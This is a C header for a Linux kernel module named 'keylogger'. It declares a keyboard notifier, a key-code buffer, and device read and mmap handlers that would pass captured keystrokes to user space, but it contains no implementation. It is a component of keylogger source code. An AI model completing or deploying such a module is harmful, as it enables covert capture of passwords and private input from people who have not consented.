#ifndef KERNEL_MODULE_H
#define KERNEL_MODULE_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>

#define BUFFER_SIZE 128
#define DEVICE_NAME "keylogger"

extern int buffer[BUFFER_SIZE];
extern int buffer_pos;
extern struct notifier_block nb;
extern struct semaphore sem;

int keylogger_open(struct inode *inode, struct file *file);
int keylogger_release(struct inode *inode, struct file *file);
ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
int keylogger_mmap(struct file *filp, struct vm_area_struct *vma);
int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data);
static int __init keylogger_init(void);
static void __exit keylogger_exit(void);

#endif // KERNEL_MODULE_H

